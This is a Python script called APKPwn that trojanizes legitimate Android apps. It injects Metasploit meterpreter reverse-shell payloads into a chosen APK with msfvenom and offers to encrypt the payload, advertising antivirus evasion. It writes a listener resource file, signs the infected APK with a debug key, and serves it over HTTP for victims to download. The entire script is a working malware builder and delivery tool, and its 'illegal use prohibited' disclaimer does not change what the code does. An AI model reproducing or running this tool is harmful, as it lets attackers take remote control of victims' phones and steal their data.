import os
import socket
import http.server
import socketserver
import signal
import sys
import logging
from contextlib import suppress

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "BLUE": "\033[94m",
    "WHITE": "\033[97m"
}

def banner1():
    print(f"{COLORS['RED']}╔─────────────────────────────────────────────────────────╗")
    print(f"|          {COLORS['RED']}APKPwn {COLORS['WHITE']} - with Android AV Evasion TOOL         |")
    print(f"|       Please do not upload APK to {COLORS['RED']}VirusTotal.com{COLORS['WHITE']}        |")
    print(f"{COLORS['RED']}┖─────────────────────────────────────────────────────────┙\n")

    print(f"{COLORS['GREEN']}                  .           .           ")
    print("                  M.          .M          ")
    print("                   MMMMMMMMMMM.           ")
    print("                .MMM\\MMMMMMM/MMM.         ")
    print("               .MMM.7MMMMMMM.7MMM.        ")
    print("              .MMMMMMMMMMMMMMMMMMM        ")
    print("              MMMMMMM.......MMMMMMM       ")
    print("              MMMMMMMMMMMMMMMMMMMMM       ")
    print("         MMMM MMMMMMMMMMMMMMMMMMMMM MMMM  ")
    print("        dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD ")
    print("        dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD ")
    print("        dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD ")
    print("        dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD ")
    print("        dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD ")
    print("         MMM8 MMMMMMMMMMMMMMMMMMMMM 8MMM  ")
    print("              MMMMMMMMMMMMMMMMMMMMM       ")
    print("              MMMMMMMMMMMMMMMMMMMMM       ")
    print(f"                  MMMMM   MMMMM        {COLORS['YELLOW']}APKPwn v1.0        {COLORS['WHITE']}")
    print(f"                  MMMMM   MMMMM        {COLORS['YELLOW']}Written by Lu33Y   {COLORS['WHITE']}")
    print("                  MMMMM   MMMMM           ")
    print("                  MMMMM   MMMMM           ")
    print(f"                  .MMM.   .MMM.           {COLORS['WHITE']}\n")
    print(f"{COLORS['WHITE']}╔──────────────────────────────────────────────────────────╗")
    print(f"| {COLORS['WHITE']}[ {COLORS['RED']}Author{COLORS['WHITE']}  ] {COLORS['YELLOW']}Lu33Y                                        {COLORS['WHITE']}|")
    print(f"| [ {COLORS['RED']}GitHub{COLORS['WHITE']}  ] {COLORS['YELLOW']}https://github.com/Lu33Y-No-Git              {COLORS['WHITE']}|")
    print(f"{COLORS['WHITE']}┖──────────────────────────────────────────────────────────┙\n")
    print(f"{COLORS['WHITE']}╔──────────────────────────────────────────────────────────╗")
    print(f"|     {COLORS['RED']}DISCLAIMER : Illegal Use is Strictly Prohibited      {COLORS['WHITE']}| ")
    print(f"{COLORS['WHITE']}┖──────────────────────────────────────────────────────────┙\n\n")

def get_user_input(prompt, color="BLUE"):
    return input(f"{COLORS[color]}[?] {prompt}: {COLORS['WHITE']}")

def check_dependencies_and_install():
    dependencies = {
        "apktool": "apt-get install apktool",
        "jarsigner": "apt-get install openjdk-11-jdk",
        "apksigner": "apt-get install apksigner",
        "zipalign": "apt-get install zipalign"
    }

    for tool, install_command in dependencies.items():
        print(f"{COLORS['YELLOW']}\n[*] Checking : {tool}")
        if os.system(f"which {tool} > /dev/null") == 0:
            print(f"{COLORS['GREEN']}[+] {tool} - OK")
        else:
            print(f"{COLORS['RED']}[!] {tool} - 404 NOT FOUND !")
            install_choice = input(f"{COLORS['BLUE']}[?] What to Install It Now ? (y/n) : {COLORS['WHITE']}")
            if install_choice.lower() == "y":
                os.system("apt-get update")
                os.system(install_command)

def choose_payload():
    print(f"{COLORS['YELLOW']}Choose your payload:\n")
    print("1. android/meterpreter/reverse_http")
    print("2. android/meterpreter/reverse_https")
    print("3. android/meterpreter/reverse_tcp")
    choice = input(f"{COLORS['BLUE']}[?] Enter the number corresponding to your choice: {COLORS['WHITE']}")
    
    if choice == "1":
        return "android/meterpreter/reverse_http"
    elif choice == "2":
        return "android/meterpreter/reverse_https"
    elif choice == "3":
        return "android/meterpreter/reverse_tcp"
    else:
        print(f"{COLORS['RED']}Invalid choice! Defaulting to android/meterpreter/reverse_http")
        return "android/meterpreter/reverse_http"

def encrypt_payload():
    choice = input(f"{COLORS['BLUE']}[?] Do you want to encrypt the payload? (y/n): {COLORS['WHITE']}")
    return choice.lower() == "y"

def create_payload(payload, lhost, lport, original_apk, output_apk, encrypt=False):
    print(f"{COLORS['YELLOW']}\n[*] Creating the payload with msfvenom...{COLORS['WHITE']}")
    encryption_flag = "--encrypt" if encrypt else ""
    command = f"msfvenom -x {original_apk} -p {payload} lhost={lhost} lport={lport} --platform android --arch dalvik {encryption_flag} -o {output_apk}"
    
    os.system(command)
    print(f"{COLORS['GREEN']}[+] Payload created: {output_apk}")

def create_handler(lhost, lport, payload):
    handler_file = "meterpreter_handler.rc"
    
    with open(handler_file, "w") as f:
        f.write(f"use exploit/multi/handler\n")
        f.write(f"set payload {payload}\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        f.write(f"set ExitOnSession false\n")
        f.write(f"set platform android\n")
        f.write(f"set arch dalvik\n")
        f.write(f"exploit -j -z\n")
    
    print(f"\n{COLORS['GREEN']}[+] Handler created: {handler_file}")
    print(f"{COLORS['BLUE']}[*] You can now run the handler using: {COLORS['WHITE']}msfconsole -r meterpreter_handler.rc")

def sign_apk(apk_file):
    keystore_path = os.path.expanduser("~/.android/debug.keystore")

    if not os.path.exists(keystore_path):
        print(f"{COLORS['YELLOW']}\n[*] Generating Key to Sign APK ")
        keytool_cmd = f"keytool -genkey -v -keystore {keystore_path} -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -dname 'CN=Android Debug,O=Android,C=US'"
        os.system(keytool_cmd)
        print(f"{COLORS['GREEN']}[+] Key Generated Successfully!")
    else:
        print(f"{COLORS['YELLOW']}[!] Key already exists, using existing key.")
    
    choice_to_sign_apk = input(f"{COLORS['BLUE']}\n[?] Want to Use {COLORS['GREEN']}(J)arsigner {COLORS['BLUE']}or {COLORS['GREEN']}(A)PKsigner {COLORS['BLUE']} for Signing APK (j/a): ")
    
    if choice_to_sign_apk.lower() == "j":
        print(f"{COLORS['YELLOW']}\n[*] Trying to Sign APK Using Jarsigner")
        os.system(f"jarsigner -keystore {keystore_path} -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA {apk_file} androiddebugkey")
        print(f"{COLORS['GREEN']}[+] Signed the .apk file using {keystore_path}")
    elif choice_to_sign_apk.lower() == "a":
        print(f"{COLORS['YELLOW']}\n[*] Trying to Sign APK Using APKsigner")
        os.system(f"apksigner sign --ks {keystore_path} --ks-pass pass:android --in {apk_file}")
        print(f"{COLORS['GREEN']}[+] Signed the .apk file using {keystore_path}")

def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_address = s.getsockname()[0]
    s.close()
    return ip_address

def signal_handler(sig, frame):
    print(f"\n{COLORS['GREEN']}[+] Shutting down the server.")
    sys.exit(0)

def start_server(directory, port=8000):
    os.chdir(directory)
    
    handler = http.server.SimpleHTTPRequestHandler

    logging.getLogger('http.server').setLevel(logging.CRITICAL)

    with suppress(KeyboardInterrupt), socketserver.TCPServer(("", port), handler) as httpd:
        print(f"\n{COLORS['GREEN']}[+] Serving at port {port}")
        print(f"\n{COLORS['YELLOW']}[!] Press Ctrl+C to quit the server.")
        
        signal.signal(signal.SIGINT, signal_handler)
        
        try:
            httpd.serve_forever()
        except Exception as e:
            pass

def main():
    banner1()
    check_dependencies_and_install()

    lhost = get_ip_address()
    lport = get_user_input("Enter the LPORT (your desired port)")
    original_apk = get_user_input("Enter the path to the original APK")
    output_apk = get_user_input("Enter the name for the infected APK")

    payload = choose_payload()
    encrypt = encrypt_payload()

    create_payload(payload, lhost, lport, original_apk, output_apk, encrypt)
    create_handler(lhost, lport, payload)

    sign_choice = get_user_input("Do you want to sign the APK? (y/n)")
    if sign_choice.lower() == "y":
        sign_apk(output_apk)

    apk_directory = "."
    os.rename(output_apk, os.path.join(apk_directory, output_apk))

    apk_url = f"http://{lhost}:8000/{output_apk}"
    print(f"\n{COLORS['GREEN']}[+] The infected APK is accessible at: {apk_url}")

    start_server(apk_directory)

if __name__ == "__main__":
    main()